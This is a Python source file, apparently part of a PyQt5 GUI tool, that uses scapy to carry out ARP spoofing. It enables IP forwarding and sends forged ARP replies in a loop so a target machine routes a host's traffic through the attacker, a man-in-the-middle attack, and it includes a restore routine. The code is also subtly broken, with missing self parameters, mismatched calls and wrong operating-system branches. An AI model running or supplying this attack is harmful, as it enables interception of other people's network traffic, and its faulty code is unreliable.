from scapy.all import Ether, ARP, srp, send
import time
import os
import sys 
from PyQt5.QtCore import QCoreApplication, QObject, QRunnable, pyqtSignal, QThread
from PyQt5.QtWidgets import * 
from PyQt5.QtTest import *


class PrepareARP():
    finished = pyqtSignal()

    def __init__(self):
        super().__init__()

    def prepare(self): 
        for i in range(5):
            print(i)

    def send(self, target, host):
        arp = SendARP(target, host)
        arp.exec()


class SendARP(QThread):
    prompt = pyqtSignal(str)

    def __init__(self, target, host):
        super().__init__()

        self.target = target
        self.host = host
        self.verbose = True


    def run(self):
        self.exec()

    def exec(self):

        self.enable_ip_route()
        try:
            while True:
                self.spoof()
                self.spoof()
                time.sleep(1)
                #QTest.qWait(5000)
        except KeyboardInterrupt:
            print("[!] Detected CTRL+C ! restoring the network, please wait...")
            self.restore()
            self.restore()

    def _enable_mac_iproute():
        # sysctl -w net.inet.ip.forwarding=1
        pass

    def _enable_linux_iproute():
        file_path = "/proc/sys/net/ipv4/ip_forward"
        with open(file_path) as f:
            if f.read() == 1:
                return
        with open(file_path, "w") as f:
            print(1, file=f)

    def _enable_windows_iproute():
        from services import WService
        service = WService("RemoteAccess")
        service.start()

    def enable_ip_route(verbose=True):
        if verbose:
            print("[!] Enabling IP Routing...")
        if ("nt" in os.name):
            pass
            #_enable_windows_iproute() 
        elif ("posix" in os.name):
            self._enable_mac_iproute()
        else:
            self._enable_linux_iproute()

        if verbose:
            print("[!] IP Routing enabled.")

    def get_mac(self):
        ans, _ = srp(Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(pdst=self.target), timeout=3, verbose=0)
        if ans:
            return ans[0][1].src


    def spoof(self):
        target_mac = self.get_mac()
        arp_response = ARP(pdst=self.target, hwdst=target_mac, psrc=self.host, op='is-at')
        send(arp_response, verbose=0)
        if self.verbose:
            self_mac = ARP().hwsrc
            message = "[+] Sent to {} : {} is-at {}".format(self.target, self.host, self_mac)
            self.prompt.emit(message)
            print(message)


    def restore(self):
        target_mac = self.get_mac(self.target)
        host_mac = self.get_mac(self.host)
        arp_response = ARP(pdst=self.target, hwdst=target_mac, psrc=self.host, hwsrc=host_mac, op="is-at")
        send(arp_response, verbose=0, count=7)
        if self.verbose:
            message = "[+] Sent to {} : {} is-at {}".format(self.target, self.host, host_mac)
            self.prompt.emit(message)
            print(message)
